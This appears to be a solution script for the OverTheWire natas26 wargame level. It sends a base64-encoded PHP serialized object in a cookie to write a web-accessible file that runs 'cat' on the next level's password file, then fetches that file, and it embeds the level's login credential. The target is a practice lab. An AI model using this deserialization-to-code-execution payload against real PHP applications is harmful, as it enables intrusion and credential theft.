
#!/bin/python3
import requests
url = 'http://natas26.natas.labs.overthewire.org/'
mycookies={'drawing':'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL215cGhwLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUxOiI8P3BocCBwYXNzdGhydSgiY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3IikgPz4iO30='}
r = requests.get(url,auth=('natas26','cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'),cookies=mycookies)

url = url + 'img/myphp.php'
r = requests.get(url,auth=('natas26','cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'))
print(r.text)

